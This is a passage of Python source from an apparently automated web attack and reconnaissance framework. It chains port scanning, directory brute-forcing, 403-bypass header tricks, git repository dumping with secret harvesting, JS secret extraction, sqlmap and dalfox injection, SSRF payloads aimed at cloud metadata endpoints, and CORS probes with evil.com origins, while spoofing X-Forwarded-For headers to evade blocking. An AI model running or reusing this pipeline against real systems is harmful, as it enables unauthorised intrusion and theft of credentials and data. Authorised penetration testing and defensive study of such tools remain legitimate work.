        25:    "SMTP",       53:    "DNS",          111:   "RPC",
        389:   "LDAP",       445:   "SMB",          636:   "LDAPS",
        2375:  "Docker",     2376:  "Docker-TLS",   2379:  "etcd",
        3306:  "MySQL",      3389:  "RDP",          4848:  "GlassFish",
        5432:  "PostgreSQL", 5601:  "Kibana",       5900:  "VNC",
        6379:  "Redis",      7001:  "WebLogic",     8080:  "HTTP-Alt",
        8443:  "HTTPS-Alt",  8888:  "Jupyter",      9000:  "SonarQube",
        9090:  "Prometheus", 9200:  "Elasticsearch",9300:  "ES-Transport",
        10250: "Kubelet",    27017: "MongoDB",
    }
    CRITICAL_PORTS = {2375, 6379, 9200, 27017, 2379, 10250, 23}

    def run(self) -> list:
        if not self.registry.has("naabu"):
            log("naabu not found", "skip", self.NAME)
            return self._local

        ports = ",".join(str(p) for p in self.PORTS)
        for line in self.stream_cmd([
            self.registry.path("naabu"),
            "-host",   self.host,
            "-p",      ports,
            "-json",
            "-silent", "-rate", "1000", "-c", "50",
        ], timeout=180):
            try:
                d    = json.loads(line)
                port = d.get("port", 0)
                svc  = self.PORTS.get(port, "unknown")
                sev  = ("critical" if port in self.CRITICAL_PORTS else
                        "high"     if port in {3306, 5432, 5900, 445} else
                        "info")
                self.add("r6/in8", f"Open port {port}/{svc}", sev, "firm",
                         f"{self.host}:{port} accessible from internet",
                         f"{self.host}:{port}")
            except Exception:
                pass
        return self._local


class FeroxbusterRunner(BaseRunner):
    """r18, z8, in1-in15 — Recursive directory/file brute-force."""
    NAME = "feroxbuster"
    CATEGORY = "discover"

    SENSITIVE = {
        ".env":       ("in1",   "critical"),
        ".git":       ("in2",   "critical"),
        ".sql":       ("in12",  "critical"),
        "phpinfo":    ("in7",   "critical"),
        "adminer":    ("in7",   "critical"),
        "telescope":  ("lv14",  "critical"),
        "horizon":    ("lv14",  "critical"),
        ".map":       ("r21",   "critical"),
        ".htpasswd":  ("in1",   "critical"),
        "actuator":   ("ms10",  "high"),
        "swagger":    ("ap12",  "medium"),
        "config":     ("in1",   "high"),
        "debug":      ("in7",   "high"),
        "admin":      ("z8",    "high"),
        "jenkins":    ("in7",   "critical"),
        "phpmyadmin": ("in7",   "critical"),
        "backup":     ("in12",  "high"),
        ".bak":       ("in13",  "high"),
        "wp-admin":   ("z8",    "high"),
        "console":    ("in7",   "high"),
        "graphql":    ("ap1",   "medium"),
        "metrics":    ("ms11",  "medium"),
    }

    def run(self) -> list:
        tool = ("feroxbuster" if self.registry.has("feroxbuster") else
                "ffuf"        if self.registry.has("ffuf")        else None)
        if not tool:
            log("feroxbuster/ffuf not found", "skip", self.NAME)
            return self._local

        wl = (self.registry.wordlist("dirs_medium") or
              self.registry.wordlist("dirs_small"))
        if not wl:
            log("No wordlist — install SecLists", "skip", self.NAME)
            return self._local

        hits_200: list = []
        hits_403: list = []

        if tool == "feroxbuster":
            cmd = [
                self.registry.path("feroxbuster"),
                "--url",          self.base_url,
                "--wordlist",     wl,
                "--json",
                "--threads",      "50",
                "--rate-limit",   str(self.rate_limit),
                "--depth",        "3",
                "--status-codes", "200,201,204,301,302,307,401,403,405",
                "--filter-status","404,429,400",
                "--extensions",   "php,asp,aspx,jsp,json,bak,env,git,"
                                  "sql,conf,yaml,yml,txt,xml",
                "--header", f"X-Forwarded-For: {self._random_ip()}",
                "--header", f"X-Real-IP: {self._random_ip()}",
                "--quiet",        "--no-state",
            ] + self.auth_args
        else:
            cmd = [
                self.registry.path("ffuf"),
                "-u",   f"{self.base_url}/FUZZ",
                "-w",   wl,
                "-of",  "json",
                "-t",   "50",
                "-rate",str(self.rate_limit),
                "-mc",  "200,201,204,301,302,307,401,403,405",
                "-fc",  "404,429", "-s",
                "-H", f"X-Forwarded-For: {self._random_ip()}",
                "-H", f"X-Real-IP: {self._random_ip()}",
            ] + self.auth_args

        for line in self.stream_cmd(cmd, timeout=900):
            try:
                d      = json.loads(line)
                url    = d.get("url", d.get("input", {}).get("FUZZ", ""))
                status = d.get("status", d.get("status_code", 0))
                size   = d.get("length", d.get("content_length", 0))
                if not url:
                    continue
                if status == 403:
                    hits_403.append(url)
                    self.ckpt.append("urls_403", url)
                elif status in (200, 201, 204, 301, 302):
                    hits_200.append(url)

                url_l = url.lower()
                for pat, (cid, sev) in self.SENSITIVE.items():
                    if pat in url_l:
                        self.add(cid, f"Sensitive path: {url}", sev, "firm",
                                 f"HTTP {status} — {size} bytes", url)
                        break
            except Exception:
                pass

        (self.out / "hits_200.txt").write_text("\n".join(hits_200))
        (self.out / "hits_403.txt").write_text("\n".join(hits_403))
        log(f"{len(hits_200)} hits, {len(hits_403)} 403s",
            "ok", self.NAME, self.host)
        return self._local


class Byp4xxRunner(BaseRunner):
    """z8, z15 — 403 bypass: header tricks + path variants."""
    NAME = "byp4xx"
    CATEGORY = "discover"

    BYPASS_HEADERS = [
        {"X-Original-URL":          ""},  # value = path, filled at runtime
        {"X-Rewrite-URL":           ""},
        {"X-Override-URL":          ""},
        {"X-Forwarded-For":         "127.0.0.1"},
        {"X-Real-IP":               "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-ProxyUser-Ip":          "127.0.0.1"},
    ]

    def run(self) -> list:
        host_403s = [u for u in self.ckpt.get("urls_403", [])
                     if self.host in u][:30]
        if not host_403s:
            return self._local

        if self.registry.has("byp4xx"):
            for url in host_403s[:15]:
                rc, out, _ = self.run_cmd(
                    [self.registry.path("byp4xx"), url], timeout=30)
                if re.search(r'\b200\b', out):
                    self.add("z8", f"403 bypass confirmed: {url}", "high", "certain",
                             "byp4xx confirmed access control bypass",
                             out[:300])
        else:
            self._manual(host_403s)
        return self._local

    def _manual(self, urls: list):
        for url in urls[:15]:
            path = urllib.parse.urlparse(url).path
            # Header-based
            for tmpl in self.BYPASS_HEADERS:
                hdr = {k: (path if not v else v)
                       for k, v in tmpl.items()}
                r = self.http(url, headers=hdr)
                if r and r["status"] == 200:
                    self.add("z8", f"403 bypass via {list(tmpl.keys())[0]}", "high", "certain",
                             f"Header bypass on {url}", url)
                    break
            # Path-variant
            for variant in [f"{path}/", f"{path}//", f"{path}?",
                            f"/{path.lstrip('/').upper()}"]:
                r = self.http(variant)
                if r and r["status"] == 200:
                    self.add("z8", f"403 bypass via path: {variant}", "high", "certain",
                             "Path normalisation bypass", variant)
                    break


class GauRunner(BaseRunner):
    """r9 — Historical URL collection via gau + waybackurls."""
    NAME = "gau"
    CATEGORY = "discover"

    def run(self) -> list:
        all_urls: set = set()

        if self.registry.has("gau"):
            for line in self.stream_cmd([
                self.registry.path("gau"),
                "--subs",
                "--mc",  "200,301,302,403",
                "--ft",  "png,jpg,gif,css,woff,woff2,svg,ico,ttf",
                self.host,
            ], timeout=300):
                u = line.strip()
                if u.startswith("http"):
                    all_urls.add(u)

        if self.registry.has("waybackurls"):
            for line in self.stream_cmd(
                    [self.registry.path("waybackurls"), self.host],
                    timeout=300):
                u = line.strip()
                if u.startswith("http"):
                    all_urls.add(u)

        out_file = self.out / "all_urls.txt"
        out_file.write_text("\n".join(sorted(all_urls)))
        log(f"{len(all_urls)} historical URLs", "ok", self.NAME, self.host)

        for cid, pats in {
            "r19": ["/v1/", "/v2/", "/internal/", "/dev/", "/beta/"],
            "r9":  [".bak", ".old", ".backup", "~", ".swp"],
            "r8":  ["/.git/", "/.svn/"],
        }.items():
            hits = [u for u in all_urls if any(p in u for p in pats)]
            if hits:
                self.add(cid, f"Historical sensitive URLs: {pats[0]}", "medium", "tentative",
                         f"{len(hits)} historical URLs match pattern",
                         "\n".join(sorted(hits)[:10]))
        return self._local

    def urls(self) -> list:
        p = self.out / "all_urls.txt"
        return p.read_text().splitlines() if p.exists() else []


class KatanaRunner(BaseRunner):
    """r10, r18 — Active crawl with JS link extraction."""
    NAME = "katana"
    CATEGORY = "discover"

    def run(self) -> list:
        if not self.registry.has("katana"):
            log("katana not found", "skip", self.NAME)
            return self._local

        out_file  = self.out / "crawled_urls.txt"
        all_urls: set = set()

        for line in self.stream_cmd([
            self.registry.path("katana"),
            "-u",       self.base_url,
            "-o",       str(out_file),
            "-d",       "4",
            "-jc",               # JS crawling
            "-fx",               # follow externals
            "-timeout", "15",
            "-c",       "15",
            "-rl",      str(min(self.rate_limit, 60)),
            "-silent",  "-no-color",
        ] + self.auth_args, timeout=600):
            u = line.strip()
            if u.startswith("http"):
                all_urls.add(u)

        out_file.write_text("\n".join(sorted(all_urls)))

        param_urls = [u for u in all_urls if "?" in u]
        js_urls    = [u for u in all_urls
                      if ".js" in u.split("?")[0].lower()]

        (self.out / "param_urls.txt").write_text("\n".join(param_urls))
        (self.out / "js_urls.txt").write_text("\n".join(js_urls))

        for u in param_urls:
            self.ckpt.append("param_urls", u)
        for u in js_urls[:100]:
            self.ckpt.append("js_urls", u)

        log(f"{len(all_urls)} URLs | {len(param_urls)} params | "
            f"{len(js_urls)} JS", "ok", self.NAME, self.host)
        return self._local


class ParamDiscoveryRunner(BaseRunner):
    """r10, r19 — Hidden parameter discovery via Arjun + ParamSpider."""
    NAME = "param_discovery"
    CATEGORY = "discover"

    def run(self) -> list:
        endpoints = self._collect_endpoints()
        if not endpoints:
            return self._local
        log(f"Probing {len(endpoints)} endpoints for hidden params",
            "info", self.NAME, self.host)

        if self.registry.has("arjun"):
            self._arjun(endpoints)
        else:
            log("arjun not found — pip3 install arjun", "skip", self.NAME)

        if self.registry.has("paramspider"):
            self._paramspider()
        return self._local

    def _collect_endpoints(self) -> list:
        eps: set = {self.base_url}
        for src_name, filename in [("feroxbuster", "hits_200.txt"),
                                    ("katana",      "crawled_urls.txt")]:
            f = (self.out.parent.parent / src_name /
                 self.host.replace(":", "_") / filename)
            if f.exists():
                for u in f.read_text().splitlines():
                    if u.strip() and "?" not in u and u.startswith("http"):
                        eps.add(u.strip())
        return list(eps)[:100]

    def _arjun(self, endpoints: list):
        ep_file  = self.out / "arjun_endpoints.txt"
        out_json = self.out / "arjun_results.json"
        ep_file.write_text("\n".join(endpoints[:50]))
        for _ in self.stream_cmd([
            self.registry.path("arjun"),
            "-i", str(ep_file),
            "-oJ", str(out_json),
            "-t", "10", "--stable",
            "--rate-limit", str(self.rate_limit),
        ], timeout=900):
            pass
        if not out_json.exists():
            return
        try:
            data = json.loads(out_json.read_text())
            for endpoint, params in data.items():
                if not params:
                    continue
                plist = list(params.keys()) if isinstance(params, dict) else params
                self.add("r10/r19", f"Hidden params on {endpoint}", "medium", "tentative",
                         f"Arjun found {len(plist)} params: {plist[:5]}",
                         f"URL: {endpoint}\nParams: {plist}")
                qs = "&".join(f"{p}=FUZZ" for p in plist[:10])
                self.ckpt.append("param_urls", f"{endpoint}?{qs}")
        except Exception:
            pass

    def _paramspider(self):
        out_dir = self.out / "paramspider"
        out_dir.mkdir(exist_ok=True)
        for _ in self.stream_cmd([
            self.registry.path("paramspider"),
            "-d", self.host,
            "--output", str(out_dir),
            "--quiet",
        ], timeout=300):
            pass
        for f in out_dir.glob("*.txt"):
            for u in f.read_text().splitlines():
                u = u.strip()
                if u.startswith("http") and "?" in u:
                    self.ckpt.append("param_urls", u)


class GitDumperRunner(BaseRunner):
    """r8, in2, r7 — .git exposure → dump → TruffleHog secret scan."""
    NAME = "git_dumper"
    CATEGORY = "discover"

    def run(self) -> list:
        r = self.http("/.git/HEAD")
        if not r or r["status"] != 200:
            return self._local
        if "ref: refs/" not in r["body"] and "HEAD" not in r["body"]:
            return self._local

        self.add("r8/in2", ".git directory exposed", "critical", "certain",
                 f"Full repository downloadable: {self.base_url}/.git/",
                 self.base_url + "/.git/HEAD",
                 "Block /.git/ in web server config immediately")

        if not self.registry.has("git-dumper"):
            return self._local

        dump_dir = self.out / "git_dump"
        dump_dir.mkdir(exist_ok=True)
        for _ in self.stream_cmd([
            self.registry.path("git-dumper"),
            self.base_url + "/.git/",
            str(dump_dir),
        ], timeout=300):
            pass

        if not any(dump_dir.iterdir()):
            return self._local

        log(f"Repo dumped to {dump_dir}", "ok", self.NAME, self.host)

        if self.registry.has("trufflehog"):
            for line in self.stream_cmd([
                self.registry.path("trufflehog"),
                "filesystem", str(dump_dir),
                "--json", "--no-verification",
            ], timeout=120):
                try:
                    d   = json.loads(line)
                    det = d.get("DetectorName", "secret")
                    raw = (d.get("Raw") or "")[:60]
                    self.add("r7/cr1", f"Secret in git repo: {det}", "critical", "certain",
                             f"TruffleHog: {det}",
                             f"{raw}***")
                except Exception:
                    pass
        return self._local


class SecretJSRunner(BaseRunner):
    """r10, r21, cr1, spa6, spa8 — JS secret extraction."""
    NAME = "js_secrets"
    CATEGORY = "discover"

    SECRET_RE = re.compile(
        r'(?:api[_-]?key|secret[_-]?key|client[_-]?secret|access[_-]?token'
        r'|private[_-]?key|jwt[_-]?secret|aws[_-]?secret'
        r'|stripe[_-]?(?:secret|key)|sendgrid|mailgun|twilio|algolia'
        r'|slack[_-]?(?:token|webhook)|github[_-]?token'
        r'|database[_-]?url|db[_-]?pass)'
        r'\s*[:=]\s*["\']([A-Za-z0-9+/=_\-\.]{8,200})["\']', re.I)

    ENDPOINT_RE = re.compile(
        r"""["`'](/(?:api|v\d+|admin|internal|graphql|auth|users?|"""
        r"""account|settings?|config|manage|debug)[^\s"'`<>]{2,120})["`']""",
        re.I)

    SOURCEMAP_RE  = re.compile(r"//# sourceMappingURL=(.+\.map)\s*$", re.M)
    NEXT_PUBLIC_RE = re.compile(
        r'NEXT_PUBLIC_[A-Z0-9_]+\s*[:=]\s*["\']([^"\']{8,})["\']')

    def run(self) -> list:
        js_urls = self._collect_js_urls()
        if not js_urls:
            return self._local

        log(f"Scanning {len(js_urls)} JS files",
            "info", self.NAME, self.host)
        endpoints: set = set()

        for url in js_urls:
            r = self.http(url)
            if not r or r["status"] != 200:
                continue
            body = r["body"]

            # Hardcoded secrets
            for m in self.SECRET_RE.finditer(body):
                key = m.group(0).split("=")[0].strip()[:40]
                val = m.group(1)
                self.add("cr1", f"Hardcoded secret: {key}", "critical", "firm",
                         f"Found in {url}",
                         f"{key}={val[:6]}***{val[-2:] if len(val)>6 else ''}")

            # Source maps
            for sm in self.SOURCEMAP_RE.finditer(body):
                mp   = sm.group(1).strip()
                murl = (mp if mp.startswith("http")
                        else self.base_url + "/" + mp.lstrip("/"))
                r2   = self.http(murl)
                if r2 and r2["status"] == 200 and "sources" in r2["body"]:
                    self.add("r21/spa8", f"Source map exposed: {murl}", "critical", "certain",
                             "Full unminified source recoverable", murl)

            # NEXT_PUBLIC_ secrets
            for npm in self.NEXT_PUBLIC_RE.finditer(body):
                self.add("spa6", "NEXT_PUBLIC_ secret in client-side JS bundle", "high", "firm",
                         f"Found in {url}",
                         npm.group(0)[:100])

            # Hidden endpoints
            for ep in self.ENDPOINT_RE.findall(body):
                endpoints.add(ep)

        if endpoints:
            self.add("r10", f"JS endpoints discovered: {len(endpoints)}", "info", "tentative",
                     "Hidden API endpoints extracted from JS bundles",
                     "\n".join(sorted(endpoints)[:30]))

        # SecretFinder (if available)
        if self.registry.has("secretfinder"):
            self._run_secretfinder(js_urls[:15])
        return self._local

    def _run_secretfinder(self, js_urls: list):
        for url in js_urls:
            rc, out, _ = self.run_cmd([
                self.registry.path("secretfinder"),
                "-i", url,
                "-o", "cli",
            ], timeout=20)
            for line in out.splitlines():
                if any(kw in line.lower() for kw in
                       ["apikey", "secret", "token", "password", "private"]):
                    self.add("cr1/r10",
                             f"SecretFinder: {line[:80]}", "critical", "firm",
                             f"In {url}", line[:200])

    def _collect_js_urls(self) -> list:
        urls: set = set()
        for u in self.ckpt.get("js_urls", []):
            if self.host in u:
                urls.add(u)
        katana_js = (self.out.parent.parent / "katana" /
                     self.host.replace(":", "_") / "js_urls.txt")
        if katana_js.exists():
            for u in katana_js.read_text().splitlines():
                if u.strip():
                    urls.add(u.strip())
        return list(urls)[:80]

# ── END OF PART 1 ──────────────────────────────────────────────
# Continue with attack.py (cat core.py attack.py > apex.py)
#!/usr/bin/env python3
"""
Apex v4.1 — PART 2: Attack + Apex
============================================================
Combine with core.py to produce the full apex:
    cat core.py attack.py > apex.py
    python3 apex.py -t example.com

This file assumes all classes from core.py are already defined.
"""

import argparse
import fnmatch
import json
import os
import re
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
import concurrent.futures
from pathlib import Path
from typing import Optional

# ══════════════════════════════════════════════════════════════
# 10. NUCLEI RUNNER  (per-host, tag-set driven)
# ══════════════════════════════════════════════════════════════

class NucleiRunner(BaseRunner):
    """
    9000+ template vulnerability scanner.
    Tag set is chosen per-host by DecisionTree based on fingerprinted tech.
    Output is streamed line-by-line — never buffered in RAM.
    """
    NAME = "nuclei"
    CATEGORY = "vuln"

    SEV_MAP = {
        "critical": "critical", "high": "high",
        "medium":   "medium",   "low":  "low",
        "info":     "info",     "unknown": "info",
    }
    TID_TO_CID = {
        "exposed-git":            "in2/r8",
        "exposed-env-file":       "in1",
        "php-info":               "in7",
        "swagger":                "ap12",
        "graphql-introspection":  "ap1",
        "jwt-none-alg":           "a10",
        "cors-misconfig":         "z12",
        "ssrf":                   "ss1",
        "xss":                    "x1",
        "sqli":                   "i1",
        "default-login":          "a5",
        "spring-actuator":        "ms10",
        "wp-user-enum":           "a1",
        "laravel-debug":          "lv1",
        "firebase-db-access":     "gcp11",
        "s3-bucket-public":       "aws1",
        "kubernetes-api-server":  "k1",
        "docker-api-unauth":      "in10",
        "jenkins-unauth":         "in11",
        "elasticsearch-unauth":   "in8",
        "redis-unauth":           "in8",
        "mongodb-unauth":         "in8",
    }

    def run(self, tags: list = None) -> list:
        if not self.registry.has("nuclei"):
            log("nuclei not found", "skip", self.NAME)
            return self._local

        all_tags = tags or ["misconfig", "exposure", "cve", "tech"]
        out_json = self.out / "nuclei_results.json"

        cmd = [
            self.registry.path("nuclei"),
            "-u",           self.base_url,
            "-json-export", str(out_json),
            "-tags",        ",".join(sorted(set(all_tags))),
            "-severity",    "critical,high,medium,low,info",
            "-rate-limit",  str(min(self.rate_limit, 150)),
            "-concurrency", "25",
            "-timeout",     "10",
            "-retries",     "1",
            "-no-httpx",
            "-silent",      "-no-color",
            "-H", f"X-Forwarded-For: {self._random_ip()}",
        ] + self.auth_args

        if self.oob.domain:
            cmd += ["-iserver", self.oob.domain]

        for line in self.stream_cmd(cmd, timeout=1800):
            try:
                d    = json.loads(line)
                tid  = d.get("template-id", "")
                name = d.get("info", {}).get("name", tid)
                sev  = self.SEV_MAP.get(
                    d.get("info", {}).get("severity", "info"), "info")
                mat  = d.get("matched-at", self.base_url)
                det  = ", ".join(d.get("extracted-results", []) or [])
                cid  = next((v for k, v in self.TID_TO_CID.items()
                             if k in tid), f"nuclei/{tid}")
                
                # Confidence: high severity findings from nuclei are usually firm
                conf = "firm" if sev in ("critical", "high") else "tentative"
                self.add(cid, f"[nuclei] {name}", sev, conf, det or mat, mat)
            except Exception:
                pass

        log(f"{len(self._local)} findings", "ok", self.NAME, self.host)
        return self._local

# ══════════════════════════════════════════════════════════════
# 11. INJECTION RUNNERS  (per-host)
# ══════════════════════════════════════════════════════════════

class GFFilterRunner(BaseRunner):
    """
    Aggregates param URLs from all sources for this host,
    then uses gf to categorise them into injection-type buckets
    (sqli, xss, ssrf, lfi, ssti, idor, rce, redirect).
    Downstream runners read these files instead of all URLs.
    """
    NAME = "gf_filter"
    CATEGORY = "inject"

    PATTERNS = {
        "sqli":     "i1",   "xss":      "x1",
        "ssrf":     "ss1",  "redirect": "adv6",
        "lfi":      "f10",  "ssti":     "i10",
        "idor":     "z1",   "rce":      "i8",
    }

    def run(self) -> list:
        all_urls = self._collect()
        if not all_urls:
            return self._local

        urls_file = self.out / "all_urls.txt"
        urls_file.write_text("\n".join(all_urls))
        log(f"Filtering {len(all_urls)} URLs with gf",
            "info", self.NAME, self.host)

        if not self.registry.has("gf"):
            log("gf not found — skipping pattern filter", "skip", self.NAME)
            return self._local

        for pattern, cid in self.PATTERNS.items():
            out_file = self.out / f"{pattern}_urls.txt"
            try:
                proc = subprocess.run(
                    [self.registry.path("gf"), pattern],
                    input="\n".join(all_urls),
                    capture_output=True, text=True, timeout=30)
                matches = [u.strip() for u in proc.stdout.splitlines()
                           if u.strip()]
                if matches:
                    out_file.write_text("\n".join(matches))
                    self.add(cid, f"gf({pattern}): {len(matches)} candidate URLs", "info", "tentative",
                             f"URLs with potential {pattern.upper()} params",
                             "\n".join(matches[:5]))
            except subprocess.TimeoutExpired:
                pass
            except Exception as e:
                log(f"gf {pattern} error: {e}", "warn", self.NAME)
        return self._local

    def _collect(self) -> list:
        urls: set = set()
        # From checkpoint (populated by katana + arjun + paramspider)
        for u in self.ckpt.get("param_urls", []):
            if self.host in u:
                urls.add(u)
        # From gau output for this host
        gau_file = (self.out.parent.parent / "gau" /
                    self.host.replace(":", "_") / "all_urls.txt")
        if gau_file.exists():
            for u in gau_file.read_text().splitlines():
                if u.strip() and "?" in u:
                    urls.add(u.strip())
        return list(urls)

    def pattern_file(self, pattern: str) -> Optional[Path]:
        p = self.out / f"{pattern}_urls.txt"
        return p if p.exists() and p.stat().st_size > 0 else None


class SqlmapRunner(BaseRunner):
    """i1-i5 — SQL injection with sqlmap on gf-filtered URLs."""
    NAME = "sqlmap"
    CATEGORY = "inject"

    def run(self) -> list:
        if not self.registry.has("sqlmap"):
            log("sqlmap not found", "skip", self.NAME)
            return self._local

        gf_dir = (self.out.parent.parent / "gf_filter" /
                  self.host.replace(":", "_"))
        sqli_f = gf_dir / "sqli_urls.txt"
        raw_urls = ([u for u in sqli_f.read_text().splitlines() if u.strip()]
                    if sqli_f.exists() else [f"{self.base_url}/?id=1"])

        urls = self._dedup_by_path(raw_urls)
        log(f"{len(raw_urls)} URLs → {len(urls)} unique paths after dedup",
            "info", self.NAME, self.host)

        sql_dir = self.out / "sqlmap_data"
        sql_dir.mkdir(exist_ok=True)

        for url in urls[:15]:
            cmd = [
                self.registry.path("sqlmap"),
                "-u", url, "--batch", "--random-agent",
                "--level", "3", "--risk", "2",
                "--output-dir", str(sql_dir),
                "--forms", "--crawl", "1",
                "--timeout", "15", "--retries", "1",
                "--threads", "3", "--flush-session",
                "--headers", f"X-Forwarded-For: {self._random_ip()}",
            ]
            if self.opts.get("cookie"):
                cmd += ["--cookie", self.opts["cookie"]]
            if self.opts.get("bearer"):
                cmd += ["--headers",
                        f"Authorization: Bearer {self.opts['bearer']}"]
            if self.oob.domain:
                cmd += ["--dns-domain", self.oob.domain]

            vuln_lines: list = []
            for line in self.stream_cmd(cmd, timeout=600):
                if any(kw in line.lower() for kw in [
                    "is vulnerable", "identified the following",
                    "injectable", "payload:", "time-based blind",
                    "boolean-based blind", "error-based",
                    "union query", "stacked queries",
                ]):
                    vuln_lines.append(line.strip())

            if vuln_lines:
                inj = next(
                    (t for t in ["time-based", "boolean-based",
                                 "error-based", "union"]
                     if any(t in v.lower() for v in vuln_lines)),
                    "unknown")
                cid = {"time-based": "i3", "boolean-based": "i2",
                       "error-based": "i1"}.get(inj, "i1")
                self.add(cid, f"SQL injection ({inj}): {url}", "critical", "certain",
                         "\n".join(vuln_lines[:5]), url,
                         "Use parameterized queries / prepared statements")
        return self._local

    @staticmethod
    def _dedup_by_path(urls: list) -> list:
        seen_paths: set  = set()
        deduped:    list = []
        for url in urls:
            try:
                path = urllib.parse.urlparse(url).path
                if path not in seen_paths:
                    seen_paths.add(path)
                    deduped.append(url)
            except Exception:
                deduped.append(url)
        return deduped


class DalfoxRunner(BaseRunner):
    """x1-x3, x8 — XSS scanning with dalfox + blind OOB."""
    NAME = "dalfox"
    CATEGORY = "inject"

    def run(self) -> list:
        if not self.registry.has("dalfox"):
            log("dalfox not found", "skip", self.NAME)
            return self._local

        gf_dir = (self.out.parent.parent / "gf_filter" /
                  self.host.replace(":", "_"))
        xss_f  = gf_dir / "xss_urls.txt"
        urls   = ([u for u in xss_f.read_text().splitlines() if u.strip()][:50]
                  if xss_f.exists() else [self.base_url])

        urls_file = self.out / "targets.txt"
        urls_file.write_text("\n".join(urls))

        cmd = [
            self.registry.path("dalfox"),
            "file",       str(urls_file),
            "--format",   "json",
            "--no-color", "--silence",
            "--timeout",  "10",
            "--delay",    str(max(1000 // self.rate_limit, 10)),
            "--worker",   "20",
            "--custom-header", f"X-Forwarded-For: {self._random_ip()}",
        ]
        if self.opts.get("cookie"):
            cmd += ["--cookie", self.opts["cookie"]]
        if self.opts.get("bearer"):
            cmd += ["--custom-header",
                    f"Authorization: Bearer {self.opts['bearer']}"]
        blind_url = self.oob.probe_url("dalfox-blind", "Dalfox blind XSS")
        if blind_url:
            cmd += ["--blind", blind_url]

        for line in self.stream_cmd(cmd, timeout=900):
            try:
                d      = json.loads(line)
                xurl   = d.get("param", d.get("url", ""))
                xtype  = d.get("type", "xss").lower()
                payload = d.get("payload", "")
                cid    = ("x8" if "blind" in xtype else
                          "x3" if "dom"   in xtype else "x1")
                conf   = "certain" if "blind" in xtype else "firm"
                self.add(cid, f"XSS ({xtype}): {xurl}", "high", conf,
                         f"Payload: {payload[:120]}", xurl,
                         "Encode output; implement strict CSP")
            except Exception:
                pass
        return self._local


class SSRFRunner(BaseRunner):
    """ss1-ss12 — SSRF via param injection + OOB callbacks + SSRFmap."""
    NAME = "ssrf"
    CATEGORY = "inject"

    URL_PARAMS = [
        "url", "callback", "webhook", "redirect", "next", "return",
        "link", "src", "href", "fetch", "import", "proxy", "remote",
        "host", "dest", "uri", "resource", "target", "image", "file",
    ]
    IMDS_INDICATORS = [
        "ami-id", "instance-id", "security-credentials",
        "meta-data", "computeMetadata", "identity/oauth2",
    ]

    def run(self) -> list:
        gf_dir = (self.out.parent.parent / "gf_filter" /
                  self.host.replace(":", "_"))
        ssrf_f = gf_dir / "ssrf_urls.txt"
        urls   = ([u for u in ssrf_f.read_text().splitlines() if u.strip()][:30]
                  if ssrf_f.exists() else [self.base_url])

        oob_probe = self.oob.probe_url("ssrf-probe", f"SSRF on {self.host}")
        payloads = [p for p in [
            oob_probe,
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance",
            "http://0x7f000001/",
            "http://[::1]/",
            "dict://127.0.0.1:6379/info",
        ] if p is not None]

        for base_url in urls[:15]:
            parsed = urllib.parse.urlparse(base_url)
            params = list(urllib.parse.parse_qs(parsed.query).keys())

            for param in (params or self.URL_PARAMS[:8]):
                for pl in payloads[:3]:
                    test = self._inject(base_url, param, pl)
                    r    = self.http(test, timeout=8)
                    if r and r["status"] == 200:
                        if any(ind in r["body"]
                               for ind in self.IMDS_INDICATORS):
                            self.add("ss2", f"SSRF→IMDS via param '{param}'", "critical", "certain",
                                     f"Cloud metadata returned via ?{param}=",
                                     f"{test}\n{r['body'][:300]}")

        # SSRFmap (if installed and OOB is active)
        oob_lhost = self.oob.probe_url("ssrfmap", "SSRFmap probe")
        if SSRFMAP.exists() and ssrf_f and ssrf_f.exists() and oob_lhost:
            for line in self.stream_cmd([
                "python3", str(SSRFMAP),
                "-r", str(ssrf_f), "-p", "url", "--lhost", oob_lhost,
            ], timeout=180):
                if "ssrf" in line.lower() and "found" in line.lower():
                    self.add("ss1", f"SSRFmap: {line[:100]}", "high", "firm", line[:200])
        return self._local

    def _inject(self, url: str, param: str, value: str) -> str:
        p  = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        qs[param] = [value]
        return urllib.parse.urlunparse(
            p._replace(query=urllib.parse.urlencode(qs, doseq=True)))


class CrlfuzzRunner(BaseRunner):
    """i18 — CRLF injection scanning with crlfuzz."""
    NAME = "crlfuzz"
    CATEGORY = "inject"

    def run(self) -> list:
        if not self.registry.has("crlfuzz"):
            log("crlfuzz not found", "skip", self.NAME)
            return self._local
        for line in self.stream_cmd([
            self.registry.path("crlfuzz"),
            "-u", self.base_url, "-s",
        ], timeout=180):
            if "vuln" in line.lower() or "crlfound" in line.lower():
                self.add("i18", f"CRLF injection: {line[:100]}", "high", "firm",
                         "CRLF enables header injection / response splitting",
                         line)
        return self._local


class CorsyRunner(BaseRunner):
    """z12, z13 — CORS misconfiguration via Corsy or manual probes."""
    NAME = "corsy"
    CATEGORY = "inject"

    ORIGINS = [
        "https://evil.com",
        "null",
        "https://evil.{host}",
        "https://{host}.evil.com",
    ]

    def run(self) -> list:
        return self._run_corsy() if CORSY.exists() else self._manual()

    def _run_corsy(self) -> list:
        tf  = self.out / "targets.txt"
        tf.write_text(self.base_url)
        out = self.out / "corsy_results.json"
        h   = "User-Agent: Mozilla/5.0"
        if self.opts.get("cookie"):
            h += f"\nCookie: {self.opts['cookie']}"
        for _ in self.stream_cmd([
            "python3", str(CORSY),
            "-i", str(tf), "-o", str(out), "-t", "20", "--headers", h,
        ], timeout=180):
            pass
        if out.exists():
            try:
                for url, issues in json.loads(out.read_text()).items():
                    for issue, detail in issues.items():
                        sev = ("critical"
                               if "credential" in str(detail).lower()
                               else "high")
                        self.add("z12", f"CORS: {issue}", sev, "firm",
                                 str(detail)[:200], url)
            except Exception:
                pass
        return self._local

    def _manual(self) -> list:
        for path in ["/api/user", "/api/me", "/"]:
            for tmpl in self.ORIGINS:
                origin = tmpl.format(host=self.host)
                r = self.http(path, headers={"Origin": origin})
                if not r:
                    continue
                h    = {k.lower(): v for k, v in r["headers"].items()}
                acao = h.get("access-control-allow-origin", "")
                acac = h.get("access-control-allow-credentials", "")
                if acao in (origin, "*") or (
                        origin == "null" and acao == "null"):
                    sev = ("critical" if acac.lower() == "true"
                           else "medium")
                    cid = "z13" if origin == "null" else "z12"
                    self.add(cid, f"CORS: {origin} reflected", sev, "firm",
                             f"ACAO: {acao}, ACAC: {acac}",
                             f"Origin: {origin} → {acao}")
        return self._local

# ══════════════════════════════════════════════════════════════
